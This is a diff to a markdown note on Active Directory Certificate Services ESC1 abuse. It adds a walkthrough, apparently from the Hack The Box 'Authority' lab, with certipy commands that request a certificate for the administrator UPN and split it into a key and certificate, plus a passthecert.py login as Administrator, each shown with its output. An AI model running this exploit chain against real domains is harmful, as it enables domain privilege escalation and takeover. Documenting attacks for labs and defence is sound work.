@@ -61,10 +61,32 @@ AD CS can provide certificate-based user authentication – which can be an extr
 for example, the template 'CorpVPN' is vulnerable ESC1, where an enrolle from the Domain Computers security group can supply a subject for client authentication.
 
 ### Exploitation
-attackers can then use a tool such as ```Rubeus``` to:
 
-1. request an authentication token from Kerberos (available to any user).
-2. Use Kerberos authentication to request a certificate using the vulnerable template
+An attacker with a user or machine account with an enrollment right would request a certificate with the UPN of the target account:
+```certipy req -u 'pc01$' -p 'password' -template CorpVPN -upn 'administrator@authority.htb -target authority.authority.htb -ca AUTHORITY-CA'```
+
+```
+[*] Successfully requested certificate
+[*] Request ID is 8
+[*] Got certificate with UPN 'administrator@authority.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+## generate a crt and key for later authentication
+```$ certipy cert -pfx administrator.pfx -nokey -out administrator.crt```
+
+```[*] Writing certificate and  to 'administrator.crt'```
+
+```$ certipy cert -pfx administrator.pfx -nocert -out administrator.key```
+
+```[*] Writing private key to 'administrator.key'```
+## authentication using passthecert.py
+```python passthecert.py -action whoami -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -new-pass password```
+```Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] You are logged in as: HTB\Administrator
+```
 
 if the regkey ```HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement``` is set to 2, attackers will have to supply the szOID_NTDS_CA_SECURITY_EXT value when making a certificate request.
 
